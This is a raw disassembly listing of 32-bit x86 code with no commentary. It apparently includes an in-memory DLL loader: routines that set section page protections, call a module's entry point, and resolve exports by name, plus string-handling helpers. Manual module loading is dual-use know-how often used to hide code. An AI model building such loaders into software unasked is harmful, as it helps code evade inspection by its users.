  4039d6:	a8 20                	test   $0x20,%al
  4039d8:	74 07                	je     0x4039e1
  4039da:	0d 00 00 00 60       	or     $0x60000000,%eax
  4039df:	89 06                	mov    %eax,(%esi)
  4039e1:	8b 06                	mov    (%esi),%eax
  4039e3:	c1 e8 1d             	shr    $0x1d,%eax
  4039e6:	83 e8 00             	sub    $0x0,%eax
  4039e9:	74 34                	je     0x403a1f
  4039eb:	48                   	dec    %eax
  4039ec:	74 28                	je     0x403a16
  4039ee:	48                   	dec    %eax
  4039ef:	74 2e                	je     0x403a1f
  4039f1:	48                   	dec    %eax
  4039f2:	74 19                	je     0x403a0d
  4039f4:	48                   	dec    %eax
  4039f5:	74 0d                	je     0x403a04
  4039f7:	48                   	dec    %eax
  4039f8:	48                   	dec    %eax
  4039f9:	74 09                	je     0x403a04
  4039fb:	c7 45 fc 40 00 00 00 	movl   $0x40,-0x4(%ebp)
  403a02:	eb 22                	jmp    0x403a26
  403a04:	c7 45 fc 04 00 00 00 	movl   $0x4,-0x4(%ebp)
  403a0b:	eb 19                	jmp    0x403a26
  403a0d:	c7 45 fc 20 00 00 00 	movl   $0x20,-0x4(%ebp)
  403a14:	eb 10                	jmp    0x403a26
  403a16:	c7 45 fc 10 00 00 00 	movl   $0x10,-0x4(%ebp)
  403a1d:	eb 07                	jmp    0x403a26
  403a1f:	c7 45 fc 02 00 00 00 	movl   $0x2,-0x4(%ebp)
  403a26:	8d 45 fc             	lea    -0x4(%ebp),%eax
  403a29:	50                   	push   %eax
  403a2a:	ff 75 fc             	push   -0x4(%ebp)
  403a2d:	8b 46 e8             	mov    -0x18(%esi),%eax
  403a30:	ff 76 e4             	push   -0x1c(%esi)
  403a33:	03 87 44 01 00 00    	add    0x144(%edi),%eax
  403a39:	50                   	push   %eax
  403a3a:	ff 15 38 30 43 00    	call   *0x433038
  403a40:	85 c0                	test   %eax,%eax
  403a42:	74 12                	je     0x403a56
  403a44:	0f b7 47 46          	movzwl 0x46(%edi),%eax
  403a48:	43                   	inc    %ebx
  403a49:	83 c6 28             	add    $0x28,%esi
  403a4c:	3b d8                	cmp    %eax,%ebx
  403a4e:	72 84                	jb     0x4039d4
  403a50:	33 c0                	xor    %eax,%eax
  403a52:	5e                   	pop    %esi
  403a53:	5b                   	pop    %ebx
  403a54:	c9                   	leave
  403a55:	c3                   	ret
  403a56:	6a 09                	push   $0x9
  403a58:	58                   	pop    %eax
  403a59:	eb f7                	jmp    0x403a52
  403a5b:	55                   	push   %ebp
  403a5c:	8d 6c 24 98          	lea    -0x68(%esp),%ebp
  403a60:	81 ec 64 01 00 00    	sub    $0x164,%esp
  403a66:	a1 a0 06 44 00       	mov    0x4406a0,%eax
  403a6b:	33 c5                	xor    %ebp,%eax
  403a6d:	89 45 64             	mov    %eax,0x64(%ebp)
  403a70:	8b 4d 74             	mov    0x74(%ebp),%ecx
  403a73:	53                   	push   %ebx
  403a74:	8b 5d 7c             	mov    0x7c(%ebp),%ebx
  403a77:	57                   	push   %edi
  403a78:	8b 7d 70             	mov    0x70(%ebp),%edi
  403a7b:	33 c0                	xor    %eax,%eax
  403a7d:	89 8d 04 ff ff ff    	mov    %ecx,-0xfc(%ebp)
  403a83:	3b f8                	cmp    %eax,%edi
  403a85:	75 08                	jne    0x403a8f
  403a87:	6a fe                	push   $0xfffffffe
  403a89:	58                   	pop    %eax
  403a8a:	e9 11 01 00 00       	jmp    0x403ba0
  403a8f:	56                   	push   %esi
  403a90:	51                   	push   %ecx
  403a91:	57                   	push   %edi
  403a92:	8d b5 08 ff ff ff    	lea    -0xf8(%ebp),%esi
  403a98:	89 45 40             	mov    %eax,0x40(%ebp)
  403a9b:	89 45 54             	mov    %eax,0x54(%ebp)
  403a9e:	89 45 5c             	mov    %eax,0x5c(%ebp)
  403aa1:	89 45 58             	mov    %eax,0x58(%ebp)
  403aa4:	89 45 60             	mov    %eax,0x60(%ebp)
  403aa7:	e8 4f fb ff ff       	call   0x4035fb
  403aac:	59                   	pop    %ecx
  403aad:	59                   	pop    %ecx
  403aae:	85 c0                	test   %eax,%eax
  403ab0:	0f 85 e9 00 00 00    	jne    0x403b9f
  403ab6:	8b 45 78             	mov    0x78(%ebp),%eax
  403ab9:	e8 e9 fb ff ff       	call   0x4036a7
  403abe:	85 c0                	test   %eax,%eax
  403ac0:	0f 85 d9 00 00 00    	jne    0x403b9f
  403ac6:	ff 75 78             	push   0x78(%ebp)
  403ac9:	ff b5 04 ff ff ff    	push   -0xfc(%ebp)
  403acf:	57                   	push   %edi
  403ad0:	e8 85 fc ff ff       	call   0x40375a
  403ad5:	83 c4 0c             	add    $0xc,%esp
  403ad8:	85 c0                	test   %eax,%eax
  403ada:	0f 85 bf 00 00 00    	jne    0x403b9f
  403ae0:	e8 f9 fc ff ff       	call   0x4037de
  403ae5:	85 c0                	test   %eax,%eax
  403ae7:	0f 85 b2 00 00 00    	jne    0x403b9f
  403aed:	e8 90 fd ff ff       	call   0x403882
  403af2:	85 c0                	test   %eax,%eax
  403af4:	0f 85 a5 00 00 00    	jne    0x403b9f
  403afa:	8b fe                	mov    %esi,%edi
  403afc:	e8 ba fe ff ff       	call   0x4039bb
  403b01:	33 ff                	xor    %edi,%edi
  403b03:	3b c7                	cmp    %edi,%eax
  403b05:	0f 85 94 00 00 00    	jne    0x403b9f
  403b0b:	f6 45 78 01          	testb  $0x1,0x78(%ebp)
  403b0f:	75 21                	jne    0x403b32
  403b11:	8b 8d 70 ff ff ff    	mov    -0x90(%ebp),%ecx
  403b17:	3b cf                	cmp    %edi,%ecx
  403b19:	74 17                	je     0x403b32
  403b1b:	8b 45 4c             	mov    0x4c(%ebp),%eax
  403b1e:	57                   	push   %edi
  403b1f:	6a 01                	push   $0x1
  403b21:	03 c8                	add    %eax,%ecx
  403b23:	50                   	push   %eax
  403b24:	89 4d 60             	mov    %ecx,0x60(%ebp)
  403b27:	ff d1                	call   *%ecx
  403b29:	85 c0                	test   %eax,%eax
  403b2b:	75 05                	jne    0x403b32
  403b2d:	6a 0a                	push   $0xa
  403b2f:	58                   	pop    %eax
  403b30:	eb 6d                	jmp    0x403b9f
  403b32:	3b df                	cmp    %edi,%ebx
  403b34:	74 32                	je     0x403b68
  403b36:	8b 45 78             	mov    0x78(%ebp),%eax
  403b39:	89 43 04             	mov    %eax,0x4(%ebx)
  403b3c:	8b 45 4c             	mov    0x4c(%ebp),%eax
  403b3f:	89 43 08             	mov    %eax,0x8(%ebx)
  403b42:	8b 45 50             	mov    0x50(%ebp),%eax
  403b45:	89 43 0c             	mov    %eax,0xc(%ebx)
  403b48:	8b 45 60             	mov    0x60(%ebp),%eax
  403b4b:	89 43 10             	mov    %eax,0x10(%ebx)
  403b4e:	8b 45 c0             	mov    -0x40(%ebp),%eax
  403b51:	89 43 14             	mov    %eax,0x14(%ebx)
  403b54:	8b 45 54             	mov    0x54(%ebp),%eax
  403b57:	89 43 18             	mov    %eax,0x18(%ebx)
  403b5a:	8b 45 58             	mov    0x58(%ebp),%eax
  403b5d:	c7 03 20 00 00 00    	movl   $0x20,(%ebx)
  403b63:	89 43 1c             	mov    %eax,0x1c(%ebx)
  403b66:	eb 27                	jmp    0x403b8f
  403b68:	39 7d 54             	cmp    %edi,0x54(%ebp)
  403b6b:	74 22                	je     0x403b8f
  403b6d:	33 f6                	xor    %esi,%esi
  403b6f:	39 7d 58             	cmp    %edi,0x58(%ebp)
  403b72:	76 12                	jbe    0x403b86
  403b74:	8b 45 54             	mov    0x54(%ebp),%eax
  403b77:	ff 34 b0             	push   (%eax,%esi,4)
  403b7a:	ff 15 7c 30 45 00    	call   *0x45307c
  403b80:	46                   	inc    %esi
  403b81:	3b 75 58             	cmp    0x58(%ebp),%esi
  403b84:	72 ee                	jb     0x403b74
  403b86:	ff 75 54             	push   0x54(%ebp)
  403b89:	e8 81 a5 01 00       	call   0x41e10f
  403b8e:	59                   	pop    %ecx
  403b8f:	39 7d 40             	cmp    %edi,0x40(%ebp)
  403b92:	74 09                	je     0x403b9d
  403b94:	ff 75 40             	push   0x40(%ebp)
  403b97:	e8 73 a5 01 00       	call   0x41e10f
  403b9c:	59                   	pop    %ecx
  403b9d:	33 c0                	xor    %eax,%eax
  403b9f:	5e                   	pop    %esi
  403ba0:	8b 4d 64             	mov    0x64(%ebp),%ecx
  403ba3:	5f                   	pop    %edi
  403ba4:	33 cd                	xor    %ebp,%ecx
  403ba6:	5b                   	pop    %ebx
  403ba7:	e8 8e a4 01 00       	call   0x41e03a
  403bac:	83 c5 68             	add    $0x68,%ebp
  403baf:	c9                   	leave
  403bb0:	c3                   	ret
  403bb1:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  403bb5:	85 c9                	test   %ecx,%ecx
  403bb7:	74 27                	je     0x403be0
  403bb9:	8b 54 24 08          	mov    0x8(%esp),%edx
  403bbd:	8b 44 24 10          	mov    0x10(%esp),%eax
  403bc1:	56                   	push   %esi
  403bc2:	8d 34 0a             	lea    (%edx,%ecx,1),%esi
  403bc5:	3b 70 04             	cmp    0x4(%eax),%esi
  403bc8:	5e                   	pop    %esi
  403bc9:	76 03                	jbe    0x403bce
  403bcb:	33 c0                	xor    %eax,%eax
  403bcd:	c3                   	ret
  403bce:	8b 00                	mov    (%eax),%eax
  403bd0:	51                   	push   %ecx
  403bd1:	03 c2                	add    %edx,%eax
  403bd3:	50                   	push   %eax
  403bd4:	ff 74 24 0c          	push   0xc(%esp)
  403bd8:	e8 73 a5 01 00       	call   0x41e150
  403bdd:	83 c4 0c             	add    $0xc,%esp
  403be0:	33 c0                	xor    %eax,%eax
  403be2:	40                   	inc    %eax
  403be3:	c3                   	ret
  403be4:	55                   	push   %ebp
  403be5:	8b ec                	mov    %esp,%ebp
  403be7:	51                   	push   %ecx
  403be8:	51                   	push   %ecx
  403be9:	8b 45 08             	mov    0x8(%ebp),%eax
  403bec:	ff 75 14             	push   0x14(%ebp)
  403bef:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403bf2:	8b 45 0c             	mov    0xc(%ebp),%eax
  403bf5:	ff 75 10             	push   0x10(%ebp)
  403bf8:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403bfb:	8d 45 f8             	lea    -0x8(%ebp),%eax
  403bfe:	50                   	push   %eax
  403bff:	68 b1 3b 40 00       	push   $0x403bb1
  403c04:	e8 52 fe ff ff       	call   0x403a5b
  403c09:	83 c4 10             	add    $0x10,%esp
  403c0c:	c9                   	leave
  403c0d:	c3                   	ret
  403c0e:	55                   	push   %ebp
  403c0f:	8b ec                	mov    %esp,%ebp
  403c11:	53                   	push   %ebx
  403c12:	56                   	push   %esi
  403c13:	8b 75 08             	mov    0x8(%ebp),%esi
  403c16:	33 db                	xor    %ebx,%ebx
  403c18:	3b f3                	cmp    %ebx,%esi
  403c1a:	75 04                	jne    0x403c20
  403c1c:	33 c0                	xor    %eax,%eax
  403c1e:	eb 6c                	jmp    0x403c8c
  403c20:	8b 45 10             	mov    0x10(%ebp),%eax
  403c23:	57                   	push   %edi
  403c24:	8b 7d 0c             	mov    0xc(%ebp),%edi
  403c27:	03 f7                	add    %edi,%esi
  403c29:	89 45 08             	mov    %eax,0x8(%ebp)
  403c2c:	3d 00 00 01 00       	cmp    $0x10000,%eax
  403c31:	73 0b                	jae    0x403c3e
  403c33:	8b 4e 10             	mov    0x10(%esi),%ecx
  403c36:	3b c1                	cmp    %ecx,%eax
  403c38:	72 42                	jb     0x403c7c
  403c3a:	2b c1                	sub    %ecx,%eax
  403c3c:	eb 33                	jmp    0x403c71
  403c3e:	39 5e 18             	cmp    %ebx,0x18(%esi)
  403c41:	76 31                	jbe    0x403c74
  403c43:	eb 03                	jmp    0x403c48
  403c45:	8b 45 10             	mov    0x10(%ebp),%eax
  403c48:	50                   	push   %eax
  403c49:	8b 46 20             	mov    0x20(%esi),%eax
  403c4c:	8d 04 98             	lea    (%eax,%ebx,4),%eax
  403c4f:	8b 04 38             	mov    (%eax,%edi,1),%eax
  403c52:	03 c7                	add    %edi,%eax
  403c54:	50                   	push   %eax
  403c55:	ff 15 f0 2f 45 00    	call   *0x452ff0
  403c5b:	85 c0                	test   %eax,%eax
  403c5d:	74 08                	je     0x403c67
  403c5f:	43                   	inc    %ebx
  403c60:	3b 5e 18             	cmp    0x18(%esi),%ebx
  403c63:	72 e0                	jb     0x403c45
  403c65:	eb 0d                	jmp    0x403c74
  403c67:	8b 46 24             	mov    0x24(%esi),%eax
  403c6a:	8d 04 58             	lea    (%eax,%ebx,2),%eax
  403c6d:	0f b7 04 38          	movzwl (%eax,%edi,1),%eax
  403c71:	89 45 08             	mov    %eax,0x8(%ebp)
  403c74:	8b 45 08             	mov    0x8(%ebp),%eax
  403c77:	3b 46 14             	cmp    0x14(%esi),%eax
  403c7a:	72 04                	jb     0x403c80
  403c7c:	33 c0                	xor    %eax,%eax
  403c7e:	eb 0b                	jmp    0x403c8b
  403c80:	8b 4e 1c             	mov    0x1c(%esi),%ecx
  403c83:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  403c86:	8b 04 38             	mov    (%eax,%edi,1),%eax
  403c89:	03 c7                	add    %edi,%eax
  403c8b:	5f                   	pop    %edi
  403c8c:	5e                   	pop    %esi
  403c8d:	5b                   	pop    %ebx
  403c8e:	5d                   	pop    %ebp
  403c8f:	c3                   	ret
  403c90:	ff 74 24 08          	push   0x8(%esp)
  403c94:	8b 44 24 08          	mov    0x8(%esp),%eax
  403c98:	ff 70 08             	push   0x8(%eax)
  403c9b:	ff 70 14             	push   0x14(%eax)
  403c9e:	e8 6b ff ff ff       	call   0x403c0e
  403ca3:	83 c4 0c             	add    $0xc,%esp
  403ca6:	c3                   	ret
  403ca7:	c7 01 44 6a 43 00    	movl   $0x436a44,(%ecx)
  403cad:	e9 e3 a8 01 00       	jmp    0x41e595
  403cb2:	56                   	push   %esi
  403cb3:	8b f1                	mov    %ecx,%esi
  403cb5:	c7 06 44 6a 43 00    	movl   $0x436a44,(%esi)
  403cbb:	e8 d5 a8 01 00       	call   0x41e595
  403cc0:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  403cc5:	74 07                	je     0x403cce
  403cc7:	56                   	push   %esi
  403cc8:	e8 ab a9 01 00       	call   0x41e678
  403ccd:	59                   	pop    %ecx
  403cce:	8b c6                	mov    %esi,%eax
  403cd0:	5e                   	pop    %esi
  403cd1:	c2 04 00             	ret    $0x4
  403cd4:	c3                   	ret
  403cd5:	56                   	push   %esi
  403cd6:	8b 74 24 08          	mov    0x8(%esp),%esi
  403cda:	85 f6                	test   %esi,%esi
  403cdc:	74 2a                	je     0x403d08
  403cde:	8b 51 14             	mov    0x14(%ecx),%edx
  403ce1:	83 fa 10             	cmp    $0x10,%edx
  403ce4:	72 04                	jb     0x403cea
  403ce6:	8b 01                	mov    (%ecx),%eax
  403ce8:	eb 02                	jmp    0x403cec
  403cea:	8b c1                	mov    %ecx,%eax
  403cec:	3b f0                	cmp    %eax,%esi
  403cee:	72 18                	jb     0x403d08
  403cf0:	83 fa 10             	cmp    $0x10,%edx
  403cf3:	72 04                	jb     0x403cf9
  403cf5:	8b 01                	mov    (%ecx),%eax
  403cf7:	eb 02                	jmp    0x403cfb
  403cf9:	8b c1                	mov    %ecx,%eax
  403cfb:	8b 49 10             	mov    0x10(%ecx),%ecx
  403cfe:	03 c8                	add    %eax,%ecx
  403d00:	3b ce                	cmp    %esi,%ecx
  403d02:	76 04                	jbe    0x403d08
  403d04:	b0 01                	mov    $0x1,%al
  403d06:	eb 02                	jmp    0x403d0a
  403d08:	32 c0                	xor    %al,%al
  403d0a:	5e                   	pop    %esi
  403d0b:	c2 04 00             	ret    $0x4
  403d0e:	55                   	push   %ebp
  403d0f:	8b ec                	mov    %esp,%ebp
  403d11:	33 c0                	xor    %eax,%eax
  403d13:	83 ec 0c             	sub    $0xc,%esp
  403d16:	39 45 08             	cmp    %eax,0x8(%ebp)
  403d19:	76 38                	jbe    0x403d53
  403d1b:	83 7d 08 ff          	cmpl   $0xffffffff,0x8(%ebp)
  403d1f:	77 0d                	ja     0x403d2e
  403d21:	ff 75 08             	push   0x8(%ebp)
  403d24:	e8 68 ae 01 00       	call   0x41eb91
  403d29:	59                   	pop    %ecx
  403d2a:	85 c0                	test   %eax,%eax
  403d2c:	75 25                	jne    0x403d53
  403d2e:	83 65 08 00          	andl   $0x0,0x8(%ebp)
  403d32:	8d 45 08             	lea    0x8(%ebp),%eax
  403d35:	50                   	push   %eax
  403d36:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  403d39:	e8 fb a7 01 00       	call   0x41e539
  403d3e:	68 50 d6 43 00       	push   $0x43d650
  403d43:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403d46:	50                   	push   %eax
  403d47:	c7 45 f4 44 6a 43 00 	movl   $0x436a44,-0xc(%ebp)
  403d4e:	e8 be ae 01 00       	call   0x41ec11
  403d53:	c9                   	leave
  403d54:	c3                   	ret
  403d55:	56                   	push   %esi
  403d56:	ff 74 24 08          	push   0x8(%esp)
  403d5a:	8b f1                	mov    %ecx,%esi
  403d5c:	e8 5d a8 01 00       	call   0x41e5be
  403d61:	c7 06 44 6a 43 00    	movl   $0x436a44,(%esi)
  403d67:	8b c6                	mov    %esi,%eax
  403d69:	5e                   	pop    %esi
  403d6a:	c2 04 00             	ret    $0x4
  403d6d:	56                   	push   %esi
  403d6e:	8b f1                	mov    %ecx,%esi
  403d70:	8b 46 10             	mov    0x10(%esi),%eax
  403d73:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  403d77:	3b c1                	cmp    %ecx,%eax
  403d79:	73 0a                	jae    0x403d85
  403d7b:	68 50 6a 43 00       	push   $0x436a50
  403d80:	e8 43 97 01 00       	call   0x41d4c8
  403d85:	53                   	push   %ebx
  403d86:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  403d8a:	2b c1                	sub    %ecx,%eax
  403d8c:	3b c3                	cmp    %ebx,%eax
  403d8e:	73 02                	jae    0x403d92
  403d90:	8b d8                	mov    %eax,%ebx
  403d92:	85 db                	test   %ebx,%ebx
  403d94:	74 46                	je     0x403ddc
  403d96:	8b 56 14             	mov    0x14(%esi),%edx
  403d99:	57                   	push   %edi
  403d9a:	83 fa 10             	cmp    $0x10,%edx
  403d9d:	72 04                	jb     0x403da3
  403d9f:	8b 3e                	mov    (%esi),%edi
  403da1:	eb 02                	jmp    0x403da5
  403da3:	8b fe                	mov    %esi,%edi
  403da5:	83 fa 10             	cmp    $0x10,%edx
  403da8:	72 04                	jb     0x403dae
  403daa:	8b 16                	mov    (%esi),%edx
  403dac:	eb 02                	jmp    0x403db0
  403dae:	8b d6                	mov    %esi,%edx
  403db0:	2b c3                	sub    %ebx,%eax
  403db2:	03 f9                	add    %ecx,%edi
  403db4:	50                   	push   %eax
  403db5:	03 fb                	add    %ebx,%edi
  403db7:	03 d1                	add    %ecx,%edx
  403db9:	57                   	push   %edi
  403dba:	52                   	push   %edx
  403dbb:	e8 d0 a8 01 00       	call   0x41e690
  403dc0:	8b 46 10             	mov    0x10(%esi),%eax
  403dc3:	83 c4 0c             	add    $0xc,%esp
  403dc6:	2b c3                	sub    %ebx,%eax
  403dc8:	83 7e 14 10          	cmpl   $0x10,0x14(%esi)
  403dcc:	89 46 10             	mov    %eax,0x10(%esi)
  403dcf:	5f                   	pop    %edi
  403dd0:	72 04                	jb     0x403dd6
  403dd2:	8b 0e                	mov    (%esi),%ecx
  403dd4:	eb 02                	jmp    0x403dd8
  403dd6:	8b ce                	mov    %esi,%ecx
  403dd8:	c6 04 01 00          	movb   $0x0,(%ecx,%eax,1)
  403ddc:	5b                   	pop    %ebx
  403ddd:	8b c6                	mov    %esi,%eax
  403ddf:	5e                   	pop    %esi
  403de0:	c2 08 00             	ret    $0x8
  403de3:	80 7c 24 04 00       	cmpb   $0x0,0x4(%esp)
  403de8:	56                   	push   %esi
  403de9:	57                   	push   %edi
  403dea:	8b 7c 24 10          	mov    0x10(%esp),%edi
  403dee:	8b f1                	mov    %ecx,%esi
  403df0:	74 20                	je     0x403e12
  403df2:	83 7e 14 10          	cmpl   $0x10,0x14(%esi)
  403df6:	72 1a                	jb     0x403e12
  403df8:	53                   	push   %ebx
  403df9:	8b 1e                	mov    (%esi),%ebx
  403dfb:	85 ff                	test   %edi,%edi
  403dfd:	74 0b                	je     0x403e0a
  403dff:	57                   	push   %edi
  403e00:	53                   	push   %ebx
  403e01:	56                   	push   %esi
  403e02:	e8 49 a3 01 00       	call   0x41e150
  403e07:	83 c4 0c             	add    $0xc,%esp
  403e0a:	53                   	push   %ebx
  403e0b:	e8 68 a8 01 00       	call   0x41e678
  403e10:	59                   	pop    %ecx
  403e11:	5b                   	pop    %ebx
  403e12:	89 7e 10             	mov    %edi,0x10(%esi)
  403e15:	c7 46 14 0f 00 00 00 	movl   $0xf,0x14(%esi)
  403e1c:	c6 04 37 00          	movb   $0x0,(%edi,%esi,1)
  403e20:	5f                   	pop    %edi
  403e21:	5e                   	pop    %esi
  403e22:	c2 08 00             	ret    $0x8
  403e25:	6a 0c                	push   $0xc
  403e27:	b8 7c 16 43 00       	mov    $0x43167c,%eax
  403e2c:	e8 43 b2 01 00       	call   0x41f074
  403e31:	8b f1                	mov    %ecx,%esi
  403e33:	89 75 e8             	mov    %esi,-0x18(%ebp)
  403e36:	8b 7d 08             	mov    0x8(%ebp),%edi
  403e39:	83 cf 0f             	or     $0xf,%edi
  403e3c:	83 ff fe             	cmp    $0xfffffffe,%edi
  403e3f:	76 05                	jbe    0x403e46
  403e41:	8b 7d 08             	mov    0x8(%ebp),%edi
  403e44:	eb 27                	jmp    0x403e6d
  403e46:	33 d2                	xor    %edx,%edx
  403e48:	6a 03                	push   $0x3
  403e4a:	8b c7                	mov    %edi,%eax
  403e4c:	5b                   	pop    %ebx
  403e4d:	f7 f3                	div    %ebx
  403e4f:	8b 4e 14             	mov    0x14(%esi),%ecx
  403e52:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  403e55:	d1 6d ec             	shrl   $1,-0x14(%ebp)
  403e58:	8b 55 ec             	mov    -0x14(%ebp),%edx
  403e5b:	3b d0                	cmp    %eax,%edx
  403e5d:	76 0e                	jbe    0x403e6d
  403e5f:	6a fe                	push   $0xfffffffe
  403e61:	5f                   	pop    %edi
  403e62:	8b c7                	mov    %edi,%eax
  403e64:	2b c2                	sub    %edx,%eax
  403e66:	3b c8                	cmp    %eax,%ecx
  403e68:	77 03                	ja     0x403e6d
  403e6a:	8d 3c 0a             	lea    (%edx,%ecx,1),%edi
  403e6d:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  403e71:	8d 47 01             	lea    0x1(%edi),%eax
  403e74:	6a 00                	push   $0x0
  403e76:	50                   	push   %eax
  403e77:	e8 92 fe ff ff       	call   0x403d0e
  403e7c:	59                   	pop    %ecx
  403e7d:	59                   	pop    %ecx
  403e7e:	89 45 08             	mov    %eax,0x8(%ebp)
  403e81:	eb 27                	jmp    0x403eaa
  403e83:	8b 45 08             	mov    0x8(%ebp),%eax
  403e86:	89 65 f0             	mov    %esp,-0x10(%ebp)
  403e89:	89 45 ec             	mov    %eax,-0x14(%ebp)
  403e8c:	40                   	inc    %eax
  403e8d:	6a 00                	push   $0x0
  403e8f:	50                   	push   %eax
  403e90:	c6 45 fc 02          	movb   $0x2,-0x4(%ebp)
  403e94:	e8 75 fe ff ff       	call   0x403d0e
  403e99:	59                   	pop    %ecx
  403e9a:	89 45 08             	mov    %eax,0x8(%ebp)
  403e9d:	59                   	pop    %ecx
  403e9e:	b8 a4 3e 40 00       	mov    $0x403ea4,%eax
  403ea3:	c3                   	ret
  403ea4:	8b 75 e8             	mov    -0x18(%ebp),%esi
  403ea7:	8b 7d ec             	mov    -0x14(%ebp),%edi
  403eaa:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  403ead:	85 db                	test   %ebx,%ebx
  403eaf:	74 19                	je     0x403eca
  403eb1:	83 7e 14 10          	cmpl   $0x10,0x14(%esi)
  403eb5:	72 04                	jb     0x403ebb
  403eb7:	8b 06                	mov    (%esi),%eax
  403eb9:	eb 02                	jmp    0x403ebd
  403ebb:	8b c6                	mov    %esi,%eax
  403ebd:	53                   	push   %ebx
  403ebe:	50                   	push   %eax
  403ebf:	ff 75 08             	push   0x8(%ebp)
  403ec2:	e8 89 a2 01 00       	call   0x41e150
  403ec7:	83 c4 0c             	add    $0xc,%esp
  403eca:	6a 00                	push   $0x0
  403ecc:	6a 01                	push   $0x1
  403ece:	8b ce                	mov    %esi,%ecx
  403ed0:	e8 0e ff ff ff       	call   0x403de3
  403ed5:	8b 45 08             	mov    0x8(%ebp),%eax
  403ed8:	89 06                	mov    %eax,(%esi)
  403eda:	89 7e 14             	mov    %edi,0x14(%esi)
  403edd:	89 5e 10             	mov    %ebx,0x10(%esi)
  403ee0:	83 ff 10             	cmp    $0x10,%edi
  403ee3:	73 02                	jae    0x403ee7
  403ee5:	8b c6                	mov    %esi,%eax
  403ee7:	c6 04 18 00          	movb   $0x0,(%eax,%ebx,1)
  403eeb:	e8 f0 b1 01 00       	call   0x41f0e0
  403ef0:	c2 08 00             	ret    $0x8
  403ef3:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  403ef6:	33 f6                	xor    %esi,%esi
  403ef8:	56                   	push   %esi
  403ef9:	6a 01                	push   $0x1
  403efb:	e8 e3 fe ff ff       	call   0x403de3
  403f00:	56                   	push   %esi
  403f01:	56                   	push   %esi
  403f02:	e8 0a ad 01 00       	call   0x41ec11
  403f07:	cc                   	int3
  403f08:	6a 00                	push   $0x0
  403f0a:	6a 01                	push   $0x1
  403f0c:	e8 d2 fe ff ff       	call   0x403de3
  403f11:	c3                   	ret
  403f12:	56                   	push   %esi
  403f13:	8b 74 24 08          	mov    0x8(%esp),%esi
  403f17:	83 fe fe             	cmp    $0xfffffffe,%esi
  403f1a:	76 0a                	jbe    0x403f26
  403f1c:	68 7c 6a 43 00       	push   $0x436a7c
  403f21:	e8 55 95 01 00       	call   0x41d47b
  403f26:	8b 41 14             	mov    0x14(%ecx),%eax
  403f29:	3b c6                	cmp    %esi,%eax
  403f2b:	73 0b                	jae    0x403f38
  403f2d:	ff 71 10             	push   0x10(%ecx)
  403f30:	56                   	push   %esi
  403f31:	e8 ef fe ff ff       	call   0x403e25
  403f36:	eb 30                	jmp    0x403f68
  403f38:	33 d2                	xor    %edx,%edx
  403f3a:	38 54 24 0c          	cmp    %dl,0xc(%esp)
  403f3e:	74 18                	je     0x403f58
  403f40:	83 fe 10             	cmp    $0x10,%esi
  403f43:	73 13                	jae    0x403f58
  403f45:	8b 41 10             	mov    0x10(%ecx),%eax
  403f48:	3b f0                	cmp    %eax,%esi
  403f4a:	73 02                	jae    0x403f4e
  403f4c:	8b c6                	mov    %esi,%eax
  403f4e:	50                   	push   %eax
  403f4f:	6a 01                	push   $0x1
  403f51:	e8 8d fe ff ff       	call   0x403de3
  403f56:	eb 10                	jmp    0x403f68
  403f58:	3b f2                	cmp    %edx,%esi
  403f5a:	75 0c                	jne    0x403f68
  403f5c:	89 51 10             	mov    %edx,0x10(%ecx)
  403f5f:	83 f8 10             	cmp    $0x10,%eax
  403f62:	72 02                	jb     0x403f66
  403f64:	8b 09                	mov    (%ecx),%ecx
  403f66:	88 11                	mov    %dl,(%ecx)
  403f68:	33 c0                	xor    %eax,%eax
  403f6a:	3b c6                	cmp    %esi,%eax
  403f6c:	1b c0                	sbb    %eax,%eax
  403f6e:	f7 d8                	neg    %eax
  403f70:	5e                   	pop    %esi
  403f71:	c2 08 00             	ret    $0x8
  403f74:	55                   	push   %ebp
  403f75:	8b ec                	mov    %esp,%ebp
  403f77:	8b 45 08             	mov    0x8(%ebp),%eax
  403f7a:	8b 40 10             	mov    0x10(%eax),%eax
  403f7d:	53                   	push   %ebx
  403f7e:	56                   	push   %esi
  403f7f:	8b f1                	mov    %ecx,%esi
  403f81:	3b 45 0c             	cmp    0xc(%ebp),%eax
  403f84:	73 0a                	jae    0x403f90
  403f86:	68 50 6a 43 00       	push   $0x436a50
  403f8b:	e8 38 95 01 00       	call   0x41d4c8
  403f90:	2b 45 0c             	sub    0xc(%ebp),%eax
  403f93:	8b 5d 10             	mov    0x10(%ebp),%ebx
  403f96:	3b c3                	cmp    %ebx,%eax
  403f98:	73 02                	jae    0x403f9c
  403f9a:	8b d8                	mov    %eax,%ebx
  403f9c:	8b 46 10             	mov    0x10(%esi),%eax
  403f9f:	83 c9 ff             	or     $0xffffffff,%ecx
  403fa2:	2b c8                	sub    %eax,%ecx
  403fa4:	3b cb                	cmp    %ebx,%ecx
  403fa6:	77 0a                	ja     0x403fb2
  403fa8:	68 7c 6a 43 00       	push   $0x436a7c
  403fad:	e8 c9 94 01 00       	call   0x41d47b
  403fb2:	85 db                	test   %ebx,%ebx
  403fb4:	74 50                	je     0x404006
  403fb6:	57                   	push   %edi
  403fb7:	8d 3c 18             	lea    (%eax,%ebx,1),%edi
  403fba:	6a 00                	push   $0x0
  403fbc:	57                   	push   %edi
  403fbd:	8b ce                	mov    %esi,%ecx
  403fbf:	e8 4e ff ff ff       	call   0x403f12
  403fc4:	84 c0                	test   %al,%al
  403fc6:	74 3d                	je     0x404005
  403fc8:	8b 45 08             	mov    0x8(%ebp),%eax
  403fcb:	83 78 14 10          	cmpl   $0x10,0x14(%eax)
  403fcf:	72 02                	jb     0x403fd3
  403fd1:	8b 00                	mov    (%eax),%eax
  403fd3:	83 7e 14 10          	cmpl   $0x10,0x14(%esi)
  403fd7:	72 04                	jb     0x403fdd
  403fd9:	8b 0e                	mov    (%esi),%ecx
  403fdb:	eb 02                	jmp    0x403fdf
  403fdd:	8b ce                	mov    %esi,%ecx
